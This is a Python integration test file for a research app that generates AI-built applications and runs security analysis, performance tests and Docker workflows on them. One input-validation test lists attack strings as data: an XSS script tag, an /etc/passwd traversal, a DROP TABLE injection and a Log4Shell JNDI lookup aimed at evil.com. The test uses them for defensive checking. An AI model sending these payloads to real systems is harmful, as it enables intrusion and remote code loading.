"""
Integration tests for Thesis Research App.

Tests full workflows including application generation, analysis,
performance testing, and batch processing with real database
and service interactions.
"""
import pytest
import json
import time
from pathlib import Path
from unittest.mock import patch, Mock

from models import (
    ModelCapability, GeneratedApplication, SecurityAnalysis,
    PerformanceTest, BatchAnalysis, AnalysisStatus
)
from extensions import db


class TestApplicationWorkflow:
    """Test complete application analysis workflow."""
    
    def test_full_security_analysis_workflow(self, client, populated_database):
        """Test complete security analysis workflow."""
        model_slug = populated_database['generated_application'].model_slug
        app_num = populated_database['generated_application'].app_number
        
        # 1. Check application exists
        response = client.get(f'/app/{model_slug}/{app_num}')
        assert response.status_code == 200
        
        # 2. View analysis page
        response = client.get(f'/analysis/security/{model_slug}/{app_num}')
        assert response.status_code in [200, 404]  # Might not have template
        
        # 3. Run security analysis
        response = client.post(f'/analysis/security/{model_slug}/{app_num}/run')
        assert response.status_code in [200, 202, 302, 500]
        
        # 4. Check if analysis was created in database
        analysis = SecurityAnalysis.query.filter_by(
            application_id=populated_database['generated_application'].id
        ).first()
        
        # Analysis should exist (either from fixture or newly created)
        assert analysis is not None
    
    def test_full_performance_testing_workflow(self, client, populated_database):
        """Test complete performance testing workflow."""
        model_slug = populated_database['generated_application'].model_slug
        app_num = populated_database['generated_application'].app_number
        
        # 1. Check performance overview
        response = client.get('/performance/')
        assert response.status_code == 200
        
        # 2. View performance test page
        response = client.get(f'/performance/{model_slug}/{app_num}')
        assert response.status_code in [200, 302, 404]
        
        # 3. Run performance test
        test_data = {
            'user_count': '5',
            'spawn_rate': '1',
            'duration': '10',
            'test_type': 'load'
        }
        
        response = client.post(f'/performance/{model_slug}/{app_num}/run', data=test_data)
        assert response.status_code in [200, 202, 302, 500]
        
        # 4. Check if test was created in database
        perf_test = PerformanceTest.query.filter_by(
            application_id=populated_database['generated_application'].id
        ).first()
        
        # Test should exist (either from fixture or newly created)
        assert perf_test is not None
    
    def test_docker_management_workflow(self, client, populated_database):
        """Test Docker container management workflow."""
        model_slug = populated_database['generated_application'].model_slug
        app_num = populated_database['generated_application'].app_number
        
        # 1. Check Docker overview
        response = client.get('/docker/')
        assert response.status_code == 200
        
        # 2. Start containers
        response = client.post(f'/docker/start/{model_slug}/{app_num}')
        assert response.status_code in [200, 202, 302, 500]
        
        # 3. Check container status
        response = client.get(f'/api/status/{model_slug}/{app_num}')
        assert response.status_code in [200, 302, 404]
        
        # 4. View logs
        response = client.get(f'/docker/logs/{model_slug}/{app_num}')
        assert response.status_code in [200, 404, 500]
        
        # 5. Stop containers
        response = client.post(f'/docker/stop/{model_slug}/{app_num}')
        assert response.status_code in [200, 202, 302, 500]
    
    def test_batch_analysis_workflow(self, client, populated_database):
        """Test batch analysis workflow."""
        # 1. Check batch overview
        response = client.get('/batch/')
        assert response.status_code == 200
        
        # 2. Create batch job
        response = client.get('/batch/create')
        assert response.status_code == 200
        
        # 3. Submit batch job
        batch_data = {
            'name': 'Integration Test Batch',
            'analysis_type': 'security',
            'models': 'test_model_1',
            'app_numbers': '1,2'
        }
        
        response = client.post('/batch/create', data=batch_data)
        assert response.status_code in [200, 201, 302, 400]
        
        # 4. Check if batch was created
        batch = BatchAnalysis.query.filter_by(name='Integration Test Batch').first()
        
        # Batch might be created depending on implementation
        if batch:
            assert batch.analysis_type == 'security'
            assert batch.name == 'Integration Test Batch'


class TestDatabaseIntegration:
    """Test database integration and data consistency."""
    
    def test_model_relationships(self, populated_database):
        """Test model relationships work correctly."""
        app = populated_database['generated_application']
        security_analysis = populated_database['security_analysis']
        performance_test = populated_database['performance_test']
        
        # Test forward relationships
        assert len(app.security_analyses) >= 1
        assert len(app.performance_tests) >= 1
        
        # Test backward relationships
        assert security_analysis.application.id == app.id
        assert performance_test.application.id == app.id
    
    def test_cascade_deletes(self, populated_database):
        """Test cascade deletes work correctly."""
        app = populated_database['generated_application']
        app_id = app.id
        
        # Count related records
        security_count = SecurityAnalysis.query.filter_by(application_id=app_id).count()
        performance_count = PerformanceTest.query.filter_by(application_id=app_id).count()
        
        assert security_count > 0
        assert performance_count > 0
        
        # Delete application
        db.session.delete(app)
        db.session.commit()
        
        # Related records should be deleted
        remaining_security = SecurityAnalysis.query.filter_by(application_id=app_id).count()
        remaining_performance = PerformanceTest.query.filter_by(application_id=app_id).count()
        
        assert remaining_security == 0
        assert remaining_performance == 0
    
    def test_json_field_persistence(self, init_database):
        """Test JSON fields persist correctly."""
        # Create model with JSON data
        model = ModelCapability(
            model_id='test-persistence',
            canonical_slug='test_persistence',
            provider='test',
            model_name='Test Persistence'
        )
        
        capabilities = {'feature1': True, 'feature2': False, 'nested': {'key': 'value'}}
        metadata = {'version': '1.0', 'tags': ['test', 'integration']}
        
        model.set_capabilities(capabilities)
        model.set_metadata(metadata)
        
        db.session.add(model)
        db.session.commit()
        
        # Retrieve and verify
        retrieved = ModelCapability.query.filter_by(model_id='test-persistence').first()
        
        assert retrieved.get_capabilities() == capabilities
        assert retrieved.get_metadata() == metadata
    
    def test_enum_field_persistence(self, init_database):
        """Test enum fields persist correctly."""
        app = GeneratedApplication(
            model_slug='test_enum',
            app_number=1,
            app_type='test',
            provider='test'
        )
        
        db.session.add(app)
        db.session.commit()
        
        # Create analysis with enum status
        analysis = SecurityAnalysis(
            application_id=app.id,
            status=AnalysisStatus.RUNNING
        )
        
        db.session.add(analysis)
        db.session.commit()
        
        # Retrieve and verify enum
        retrieved = SecurityAnalysis.query.filter_by(application_id=app.id).first()
        
        assert retrieved.status == AnalysisStatus.RUNNING
        assert retrieved.status.value == 'running'
    
    def test_unique_constraints(self, init_database):
        """Test unique constraints are enforced."""
        # Test ModelCapability unique constraint
        model1 = ModelCapability(
            model_id='unique-test',
            canonical_slug='unique_test',
            provider='test',
            model_name='Test 1'
        )
        
        model2 = ModelCapability(
            model_id='unique-test',  # Same ID
            canonical_slug='unique_test_2',
            provider='test',
            model_name='Test 2'
        )
        
        db.session.add(model1)
        db.session.commit()
        
        db.session.add(model2)
        
        with pytest.raises(Exception):  # Should raise integrity error
            db.session.commit()


class TestApiIntegration:
    """Test API endpoint integration."""
    
    def test_dashboard_api_integration(self, client, populated_database, auth_headers):
        """Test dashboard API endpoints work together."""
        # 1. Get dashboard stats
        response = client.get('/api/dashboard-stats', headers=auth_headers)
        assert response.status_code == 200
        
        # 2. Get header stats
        response = client.get('/api/header-stats', headers=auth_headers)
        assert response.status_code == 200
        
        # 3. Get sidebar stats
        response = client.get('/api/sidebar-stats', headers=auth_headers)
        assert response.status_code == 200
        
        # 4. Get system health
        response = client.get('/api/system-health', headers=auth_headers)
        assert response.status_code == 200
    
    def test_search_api_integration(self, client, populated_database, auth_headers):
        """Test search API functionality."""
        # 1. Basic search
        response = client.get('/api/search', headers=auth_headers)
        assert response.status_code == 200
        
        # 2. Search with parameters
        response = client.get('/api/search?search=test', headers=auth_headers)
        assert response.status_code == 200
        
        # 3. Advanced search
        response = client.get('/api/advanced-search', headers=auth_headers)
        assert response.status_code == 200


class TestServiceIntegration:
    """Test service integration in full application context."""
    
    @patch('core_services.DockerManager')
    def test_docker_service_integration(self, mock_docker_class, app):
        """Test Docker service integration."""
        mock_docker = Mock()
        mock_docker.get_container_status.return_value = {'backend': 'running', 'frontend': 'running'}
        mock_docker.start_containers.return_value = {'success': True}
        mock_docker_class.return_value = mock_docker
        
        with app.app_context():
            # Service should be available through app config
            service_manager = app.config.get('service_manager')
            
            if service_manager:
                docker_service = service_manager.get_service('docker_manager')
                
                if docker_service:
                    # Test service operations
                    status = docker_service.get_container_status('test_model', 1)
                    assert isinstance(status, dict)
                    
                    result = docker_service.start_containers('test_model', 1)
                    assert isinstance(result, dict)
    
    def test_performance_service_integration(self, app, mock_performance_tester):
        """Test performance service integration."""
        with app.app_context():
            # Test performance tester functionality
            result = mock_performance_tester.run_performance_test('test_model', 1)
            
            assert isinstance(result, dict)
            assert 'status' in result
    
    def test_security_service_integration(self, app, mock_security_analyzer):
        """Test security analysis service integration."""
        with app.app_context():
            # Test security analyzer functionality
            result = mock_security_analyzer.analyze_application('/fake/path')
            
            assert isinstance(result, dict)
            assert 'status' in result
            assert 'results' in result


class TestConfigurationIntegration:
    """Test configuration loading and integration."""
    
    def test_model_capabilities_loading(self, app, temp_config_files):
        """Test model capabilities are loaded correctly."""
        with app.app_context():
            # Simulate loading capabilities
            with open(temp_config_files['capabilities_file']) as f:
                capabilities_data = json.load(f)
            
            assert 'models' in capabilities_data
            
            # Test that data structure is correct
            models = capabilities_data['models']
            for model_id, model_data in models.items():
                assert 'provider' in model_data
                assert 'name' in model_data
    
    def test_port_configuration_loading(self, app, temp_config_files):
        """Test port configuration is loaded correctly."""
        with app.app_context():
            # Simulate loading port config
            with open(temp_config_files['port_file']) as f:
                port_data = json.load(f)
            
            assert isinstance(port_data, list)
            
            if port_data:
                config = port_data[0]
                assert 'model' in config
                assert 'app_num' in config
                assert 'frontend_port' in config
                assert 'backend_port' in config
    
    def test_application_config_integration(self, app):
        """Test application configuration integration."""
        with app.app_context():
            # Test that Flask app has expected configuration
            assert app.config['TESTING'] is True
            assert 'SQLALCHEMY_DATABASE_URI' in app.config
            
            # Test that services are configured
            service_manager = app.config.get('service_manager')
            assert service_manager is not None


class TestErrorHandlingIntegration:
    """Test error handling across the application."""
    
    def test_database_error_handling(self, client, init_database):
        """Test handling of database errors."""
        # Try to access non-existent application
        response = client.get('/app/nonexistent/999')
        
        # Should handle gracefully
        assert response.status_code in [200, 302, 404]
    
    def test_service_error_handling(self, client, populated_database):
        """Test handling of service errors."""
        model_slug = populated_database['generated_application'].model_slug
        app_num = populated_database['generated_application'].app_number
        
        # Try to start containers (might fail if Docker not available)
        response = client.post(f'/docker/start/{model_slug}/{app_num}')
        
        # Should handle errors gracefully
        assert response.status_code in [200, 202, 302, 500]
    
    def test_template_error_handling(self, client):
        """Test handling of template errors."""
        # Access page that might have missing template
        response = client.get('/generation/')
        
        # Should either work or fail gracefully
        assert response.status_code in [200, 404, 500]
    
    @patch('web_routes.get_app_info')
    def test_route_exception_handling(self, mock_get_app_info, client):
        """Test route exception handling."""
        # Mock function to raise exception
        mock_get_app_info.side_effect = Exception("Test exception")
        
        response = client.get('/app/test/1')
        
        # Should handle exception gracefully
        assert response.status_code in [200, 302, 500]


class TestPerformanceIntegration:
    """Test application performance under various conditions."""
    
    def test_database_query_performance(self, populated_database):
        """Test database query performance."""
        start_time = time.time()
        
        # Query multiple tables
        models = ModelCapability.query.all()
        apps = GeneratedApplication.query.all()
        analyses = SecurityAnalysis.query.all()
        
        end_time = time.time()
        query_time = end_time - start_time
        
        # Queries should be reasonably fast
        assert query_time < 1.0
        
        # Verify we got data
        assert len(models) > 0
        assert len(apps) > 0
        assert len(analyses) > 0
    
    def test_api_response_times(self, client, populated_database, auth_headers):
        """Test API endpoint response times."""
        endpoints = [
            '/api/dashboard-stats',
            '/api/header-stats',
            '/api/system-health'
        ]
        
        for endpoint in endpoints:
            start_time = time.time()
            response = client.get(endpoint, headers=auth_headers)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            assert response.status_code == 200
            assert response_time < 2.0  # Should respond within 2 seconds
    
    def test_concurrent_requests_integration(self, client, auth_headers):
        """Test handling concurrent requests."""
        import threading
        import time
        
        results = []
        errors = []
        
        def make_request(endpoint):
            try:
                response = client.get(endpoint, headers=auth_headers)
                results.append(response.status_code)
            except Exception as e:
                errors.append(str(e))
        
        # Create concurrent requests
        threads = []
        endpoints = ['/api/health-status'] * 10  # 10 identical requests
        
        start_time = time.time()
        
        for endpoint in endpoints:
            thread = threading.Thread(target=make_request, args=(endpoint,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # All requests should succeed
        assert len(errors) == 0
        assert all(status == 200 for status in results)
        
        # Should complete within reasonable time
        assert total_time < 10.0


class TestSecurityIntegration:
    """Test security features integration."""
    
    def test_input_validation_integration(self, client):
        """Test input validation across routes."""
        # Test various malicious inputs
        malicious_inputs = [
            '<script>alert("xss")</script>',
            '../../etc/passwd',
            'DROP TABLE users;',
            '${jndi:ldap://evil.com/a}'
        ]
        
        for malicious_input in malicious_inputs:
            # Test in URL path
            response = client.get(f'/app/{malicious_input}/1')
            assert response.status_code in [200, 302, 400, 404]
            
            # Test in search parameters
            response = client.get(f'/api/search?search={malicious_input}')
            assert response.status_code in [200, 400]
    
    def test_error_information_disclosure(self, client):
        """Test that errors don't disclose sensitive information."""
        # Access non-existent resources
        response = client.get('/app/nonexistent/999')
        
        # Should not expose internal paths or stack traces
        response_text = response.get_data(as_text=True)
        
        # Check for common information disclosure patterns
        sensitive_patterns = [
            '/usr/local/',
            'C:\\',
            'Traceback',
            'Exception',
            'Database',
            'SQL'
        ]
        
        for pattern in sensitive_patterns:
            # Some patterns might be acceptable in development
            if pattern in response_text and not client.application.debug:
                pytest.fail(f"Potential information disclosure: {pattern}")
    
    def test_http_security_headers(self, client):
        """Test HTTP security headers."""
        response = client.get('/')
        
        # Check for security headers (these might not be implemented yet)
        headers = response.headers
        
        # These are recommendations, not strict requirements
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection'
        ]
        
        # Just log missing headers for now
        for header in security_headers:
            if header not in headers:
                print(f"Missing security header: {header}")


class TestDataConsistency:
    """Test data consistency across operations."""
    
    def test_application_data_consistency(self, populated_database):
        """Test application data remains consistent."""
        app = populated_database['generated_application']
        
        # Test that related data is consistent
        security_analyses = SecurityAnalysis.query.filter_by(application_id=app.id).all()
        performance_tests = PerformanceTest.query.filter_by(application_id=app.id).all()
        
        # All related records should reference the same application
        for analysis in security_analyses:
            assert analysis.application_id == app.id
            assert analysis.application.model_slug == app.model_slug
        
        for test in performance_tests:
            assert test.application_id == app.id
            assert test.application.model_slug == app.model_slug
    
    def test_port_configuration_consistency(self, populated_database):
        """Test port configuration consistency."""
        port_config = populated_database['port_configuration']
        
        # Test that ports are within valid ranges
        assert 1024 < port_config.frontend_port < 65536
        assert 1024 < port_config.backend_port < 65536
        
        # Test that ports are different
        assert port_config.frontend_port != port_config.backend_port
    
    def test_model_capability_consistency(self, populated_database):
        """Test model capability data consistency."""
        model = populated_database['model_capability']
        
        # Test that capabilities make sense
        if model.is_free:
            # Free models typically have limitations
            assert model.input_price_per_token == 0.0
            assert model.output_price_per_token == 0.0
        
        # Test that context window is reasonable
        assert model.context_window >= 0
        assert model.max_output_tokens >= 0
        
        if model.max_output_tokens > 0:
            # Output tokens shouldn't exceed context window
            assert model.max_output_tokens <= model.context_window
